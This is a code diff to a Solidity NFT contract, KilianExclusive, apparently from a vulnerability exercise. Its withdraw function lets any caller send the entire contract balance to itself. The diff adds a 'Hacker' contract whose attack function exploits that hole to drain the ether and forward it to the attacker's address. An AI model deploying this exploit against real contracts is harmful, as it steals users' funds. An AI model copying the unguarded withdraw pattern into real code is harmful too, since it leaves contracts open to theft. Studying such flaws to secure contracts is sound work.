@@ -75,11 +75,32 @@ contract KilianExclusive is ERC721, Ownable {
     }
 
     function withdraw(address _to) public {
-        require(msg.sender == _to);
+        require(msg.sender == _to, "_to don't match the caller");
         payable(_to).transfer(address(this).balance);
     }
 
     function flipSaleState() public onlyOwner {
         saleIsActive = !saleIsActive;
     }
+}
+
+contract Hacker {
+    KilianExclusive kiki;
+    address payable owner;
+
+    constructor(address _kiki){
+        kiki = KilianExclusive(_kiki);
+        owner = payable(msg.sender);
+    }
+
+    function attack() external {
+        kiki.withdraw(address(this));
+        (bool success, ) = owner.call{value: address(this).balance}("");
+        require(success);
+    }
+
+    receive() external payable {
+
+    }
+
 }
